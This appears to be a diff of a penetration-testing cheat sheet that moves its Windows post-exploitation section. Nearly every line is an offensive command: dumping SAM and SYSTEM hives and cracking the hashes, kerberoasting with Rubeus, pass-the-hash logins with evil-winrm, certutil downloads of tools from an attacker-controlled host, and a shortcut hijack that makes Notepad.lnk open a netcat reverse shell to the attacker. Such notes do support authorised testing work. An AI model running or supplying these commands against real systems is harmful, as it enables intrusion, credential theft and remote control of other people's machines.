@@ -343,51 +343,6 @@ export TERM=xterm-256color;
 stty rows <num> columns <num>
 reset
 ## Windows
-[*] Enumeration
-powershell -c "Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher"
-cd C:\ & dir /S /B SAM == SYSTEM == SAM.* == SYSTEM.*
-icacls C:\Windows\System32\Config
-whoami /priv
-cd C:\users; tree /f
-wmic useraccount get name,sid
-powershell -c "Set-ExecutionPolicy unrestricted"
-
-[*] SeBackupPrivilege
-robocopy /b \Users\Administrator\Desktop .
-
-[*] File Transfer
-python3 -m http.server -d Downloads/upload/windows 8088
-powershell -c "certutil -urlcache -f http://$MYIP:8088/winpeas.exe C:\programdata\winpeas.exe"
-powershell -c "certutil -urlcache -f http://$MYIP:8088/nc.exe C:\programdata\nc.exe"
-
-[*] SAM
-nxc winrm $TARGET -u '$USERNAME' -p '$PASSWORD' --sam --dump-method powershell
-
-cd c:\programdata; reg save hklm\sam SAM; reg save hklm\system SYSTEM;
-download SAM
-download SYSTEM
-impacket-secretsdump LOCAL -sam SAM -system SYSTEM
-echo 'Administrator:500:...................' > hashes
-hashcat -m 1000 -a 0 hashes /usr/share/wordlists/rockyou.txt
-
-[*] Rubeus
-Rubeus.exe kerberoast
-nano hashes; cat hashes | awk '{$1=$1}1' | tr -d '\n' | tee hashes; john hashes -w=/usr/share/wordlists/rockyou.txt --format=krb5tgs
-Rubeus.exe asreproast
-nano hashes; cat hashes | awk '{$1=$1}1' | tr -d '\n' | tee hashes; john hashes -w=/usr/share/wordlists/rockyou.txt --format=krb5asrep
-
-[*] evil-winrm
-evil-winrm -i "$TARGET" -u '$USERNAME' -p '$PASSWORD'
-evil-winrm -i "$TARGET" -u '$USERNAME' -H '$HASH'
-
-[*] url / .lnk exploits
-click.url
-[InternetShortcut]
-URL=C:\programdata\shell.bat
-
-[Notepad.lnk - Inject Reverse Shell]
-powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('C:\Common Applications\Notepad.lnk');$s.TargetPath='C:\Windows\System32\cmd.exe';$s.Arguments='/c \"C:\ProgramData\nc.exe $MYIP 4444 -e cmd\"';$s.Save()"
-
 [*] Metasploit
 getuid
 getprivs
@@ -413,6 +368,50 @@ reload_all
 background
 sessions
 sessions -i 1
+
+[*] Enumeration
+powershell -c "Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher"
+cd C:\ & dir /S /B SAM == SYSTEM == SAM.* == SYSTEM.*
+icacls C:\Windows\System32\Config
+whoami /priv
+cd C:\users; tree /f
+wmic useraccount get name,sid
+powershell -c "Set-ExecutionPolicy unrestricted"
+
+[*] SeBackupPrivilege
+robocopy /b \Users\Administrator\Desktop .
+
+[*] File Transfer
+python3 -m http.server -d Downloads/upload/windows 8088
+powershell -c "certutil -urlcache -f http://$MYIP:8088/winpeas.exe C:\programdata\winpeas.exe"
+powershell -c "certutil -urlcache -f http://$MYIP:8088/nc.exe C:\programdata\nc.exe"
+
+[*] SAM
+nxc winrm $TARGET -u '$USERNAME' -p '$PASSWORD' --sam --dump-method powershell
+cd c:\programdata; reg save hklm\sam SAM; reg save hklm\system SYSTEM;
+download SAM
+download SYSTEM
+impacket-secretsdump LOCAL -sam SAM -system SYSTEM
+echo 'Administrator:500:...................' > hashes
+hashcat -m 1000 -a 0 hashes /usr/share/wordlists/rockyou.txt
+
+[*] Rubeus
+Rubeus.exe kerberoast
+nano hashes; cat hashes | awk '{$1=$1}1' | tr -d '\n' | tee hashes; john hashes -w=/usr/share/wordlists/rockyou.txt --format=krb5tgs
+Rubeus.exe asreproast
+nano hashes; cat hashes | awk '{$1=$1}1' | tr -d '\n' | tee hashes; john hashes -w=/usr/share/wordlists/rockyou.txt --format=krb5asrep
+
+[*] evil-winrm
+evil-winrm -i "$TARGET" -u '$USERNAME' -p '$PASSWORD'
+evil-winrm -i "$TARGET" -u '$USERNAME' -H '$HASH'
+
+[*] url / .lnk exploits
+click.url
+[InternetShortcut]
+URL=C:\programdata\shell.bat
+
+[Notepad.lnk - Inject Reverse Shell]
+powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('C:\Common Applications\Notepad.lnk');$s.TargetPath='C:\Windows\System32\cmd.exe';$s.Arguments='/c \"C:\ProgramData\nc.exe $MYIP 4444 -e cmd\"';$s.Save()"
 
 [*] Powerview
 powershell -c "certutil -urlcache -f http://$MYIP:8088/powerview.ps1 C:\programdata\powerview.ps1"
